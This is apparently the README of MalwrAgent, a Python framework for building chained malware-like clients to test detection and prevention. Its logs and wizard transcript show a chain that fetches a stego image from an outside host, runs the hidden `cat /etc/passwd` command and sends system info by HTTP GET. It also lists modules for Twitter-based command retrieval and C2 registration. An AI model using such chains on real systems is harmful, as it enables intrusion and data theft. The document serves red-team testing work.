     __   __  _______  ___      _     _  ______    _______  _______  _______  __    _  _______ 
    |  |_|  ||   _   ||   |    | | _ | ||    _ |  |   _   ||       ||       ||  |  | ||       |
    |       ||  |_|  ||   |    | || || ||   | ||  |  |_|  ||    ___||    ___||   |_| ||_     _|
    |       ||       ||   |    |       ||   |_||_ |       ||   | __ |   |___ |       |  |   |  
    |       ||       ||   |___ |       ||    __  ||       ||   ||  ||    ___||  _    |  |   |  
    | ||_|| ||   _   ||       ||   _   ||   |  | ||   _   ||   |_| ||   |___ | | |   |  |   |  
    |_|   |_||__| |__||_______||__| |__||___|  |_||__| |__||_______||_______||_|  |__|  |___|  

    -- .- .-.. .-- .-. .- --. . -. - 

[![Build Status](https://travis-ci.org/michaelschratt/MalwrAgent.svg?branch=master)](https://travis-ci.org/michaelschratt/MalwrAgent) [![Code Climate](https://codeclimate.com/github/michaelschratt/MalwrAgent/badges/gpa.svg)](https://codeclimate.com/github/michaelschratt/MalwrAgent) [![Codacy Badge](https://api.codacy.com/project/badge/Grade/ac34274f76e742f089e82684c2e50dee)](https://www.codacy.com/app/bl4ckw0rm/MalwrAgent?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=michaelschratt/MalwrAgent&amp;utm_campaign=Badge_Grade)

### About MalwrAgent

#### THIS PROJECT IS STILL IN ALPHA STATE

Hello Agent M! Welcome to the MalwrAgency. The MalwrAgent enables you to test your current detection & prevention capabilities in just a few simple steps. The idea is to offer a framework of different modules you can connect to make up a chain. For example, egress testing can be established by connecting multiple HTTP POST and HTTP GET requests. 

Threat actors tend to use more sophisticated techniques like steganography. This technique is not only applied during infiltration but also used for data exfiltration based on video or image steganography.
Following log output demonstrates the download of an image that contains a hidden string. This string is then used as an input argument for the Command module. Finally, `cat /etc/passwd` is executed. 

    bl4ckw0rm@einsteinium > python malwragent.py -l -c myChains/Stego.json --log 3
    INFO:root:client: Checking f_retrieve_image with parameters {u'url': u'http://mfs-enterprise.com/agency/stego.png'}
    INFO:root:client: Checking f_extract_text_from_image with parameters None
    INFO:root:client: Checking f_exec_system with parameters None
    Autopilot takes over in
       3
       2
       1
    INFO:root:myChains/Stego: Chain CLIENT running
    INFO:root:myChains/Stego: Running function f_retrieve_image from module Web with input <None> and args <{u'url': u'http://mfs-enterprise.com/agency/stego.png'}>
    INFO:root:myChains/Stego: Running Transportation module malwragent.packages.modules.web.Web - Args: {'settings': {u'function': u'f_retrieve_image', 'input': None, u'args': {u'url': u'http://mfs-enterprise.com/agency/stego.png'}}}
    INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): mfs-enterprise.com
    INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): www.mfs-enterprise.com
    INFO:root:myChains/Stego: Running function f_extract_text_from_image from module Stego with input <<cStringIO.StringI object at 0x10be7fad0>> and args <None>
    INFO:root:myChains/Stego: Running Transformation module malwragent.packages.modules.stego.Stego - Args: {'settings': {u'function': u'f_extract_text_from_image', 'input': <cStringIO.StringI object at 0x10be7fad0>, u'args': None}}
    INFO:root:myChains/Stego: Running function f_exec_system from module Command with input <cat /etc/passwd> and args <None>
    INFO:root:myChains/Stego: Running Post module malwragent.packages.modules.command.Command - Args: {'settings': {u'function': u'f_exec_system', 'input': 'cat /etc/passwd', u'args': None}}
    INFO:root:myChains/Stego: Chain CLIENT finished
    ^C
    Bye, Bye

Just as one likes, you could use any other module to invoke an action on the previous output. And so on ... But in the end, you should have an eye at your detection & prevention products, and develop new defensive strategies. 

### Get started

    bl4ckw0rm@einsteinium > python malwragent.py
    usage: malwragent.py [-h] [-l] [-w] [-c CONFIGFILE] [-i INTERVAL]
                         [--log {1,2,3,4}] [-V]
    
    optional arguments:
      -h, --help            show this help message and exit
      -l, --load            load and run chain from a configuration file.
      -w, --wizard          create and save a chain to configuration file
      -c CONFIGFILE, --configfile CONFIGFILE
                            configuration file name, default: config.json
      -i INTERVAL, --interval INTERVAL
                            interval for periodic chain execution, default: 10
                            seconds
      --log {1,2,3,4}       increase logging output verbosity
      -V, --version         show program's version number and exit
    
You can use the wizard to create a new client. A client consists of a chain of modules. The chain is stored in JSON format.

    bl4ckw0rm@einsteinium > python malwragent.py -w -c myChains/test             
    #   __   __  _______  ___      _     _  ______    _______  _______  _______  __    _  _______ 
    #  |  |_|  ||   _   ||   |    | | _ | ||    _ |  |   _   ||       ||       ||  |  | ||       |
    #  |       ||  |_|  ||   |    | || || ||   | ||  |  |_|  ||    ___||    ___||   |_| ||_     _|
    #  |       ||       ||   |    |       ||   |_||_ |       ||   | __ |   |___ |       |  |   |  
    #  |       ||       ||   |___ |       ||    __  ||       ||   ||  ||    ___||  _    |  |   |  
    #  | ||_|| ||   _   ||       ||   _   ||   |  | ||   _   ||   |_| ||   |___ | | |   |  |   |  
    #  |_|   |_||__| |__||_______||__| |__||___|  |_||__| |__||_______||_______||_|  |__|  |___|  
    #
    #   -- .- .-.. .-- .-. .- --. . -. - 
    #
    #  Hello Agent M! Welcome to the MalwrAgency. Use our MalwrAgent to create your 
    #  highly flexible and easy to use Malwr. Please go ahead ...
    #
    #  Do you want your client to register with C2-Server? (Y|N) \> n
    #  Choose from our list of modules. What do you want the client to do?
    #
    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> m
    
    function                         type            module         choice
    -------------------------------  --------------  -----------  --------
    f_exec_system                    Post            Command             0
    f_base64_decode                  Transformation  Crypto              1
    f_base64_encode                  Transformation  Crypto              2
    f_md5                            Transformation  Crypto              3
    f_sha1                           Transformation  Crypto              4
    f_sha256                         Transformation  Crypto              5
    f_get_platform                   Post            Enumeration         6
    f_get_platform_machine           Post            Enumeration         7
    f_get_platform_processor         Post            Enumeration         8
    f_get_platform_system            Post            Enumeration         9
    f_get_platform_uname             Post            Enumeration        10
    f_get_platform_version           Post            Enumeration        11
    f_extract_text_from_image        Transformation  Stego              12
    f_grab_cmd_from_twitter_profile  Transportation  Twitter            13
    f_http_get                       Transportation  Web                14
    f_http_post                      Transportation  Web                15
    f_retrieve_image                 Transportation  Web                16
    
    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> 
    
    Adding function f_get_platform_uname from module Enumeration done
    
    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> 14
    
    Please provide the following arguments: url
    
    # +[url] \> http://mfs-enterprise.com/agency/?info=
    
    Adding function f_http_get from module Web done
    
    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> n
    #
    #  Do you want to review your chain? (Y|N) \> y
    
    function              type            module       chain    arguments
    --------------------  --------------  -----------  -------  --------------------------------------------------
    f_get_platform_uname  Post            Enumeration  CLIENT
    f_http_get            Transportation  Web          CLIENT   {'url': 'http://mfs-enterprise.com/agency/?info='}
    
    #  Do you want to save the chain as myChains/test.json? (Y|N) \> y
    
    See you then. Use 'malwragent.py -l -c myChains/test.json' to run your client.


### Future Work

Please follow my repository's projects

### Write your own modules

TBD

### Support

Just drop me a line. Please, use contact information from below.

### Supported Operating Systems

Linux, macOS

### Contribute

Feel free to browse through open issues and help where you can.

### Contact Information

Name: Michael Schratt

Twitter: [@bl4ckw0rm](https://twitter.com/bl4ckw0rm)

Email: github@mfs-enterprise.com

### Licence

The MIT License (MIT)

Visit [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT) for further information.

#### Disclaimer

All the information provided on this site are for educational purposes only. The site or the authors are not responsible for any misuse. Do not use the information to write malicious software. Use the information to expand knowledge and improve current or future detection & prevention technology. Use at your own risk. Breaking into computer systems is illegal.